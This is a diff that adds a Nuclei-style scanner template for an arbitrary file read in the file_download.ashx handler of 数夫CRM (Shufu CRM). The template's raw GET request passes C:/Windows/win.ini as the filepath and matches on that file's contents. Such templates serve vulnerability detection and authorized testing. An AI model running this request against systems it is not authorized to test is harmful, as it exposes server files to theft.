@@ -1,0 +1,23 @@
+id: shufuCRM-file_download_ashx-File-reading
+
+info:
+  name: 数夫CRM客户关系管理系统  file_download.ashx 任意文件读取漏洞
+  author: xxx
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /Web/common/Handler/file_download.ashx?filepath=C:/Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+      - type: status
+        status: 
+          - 200
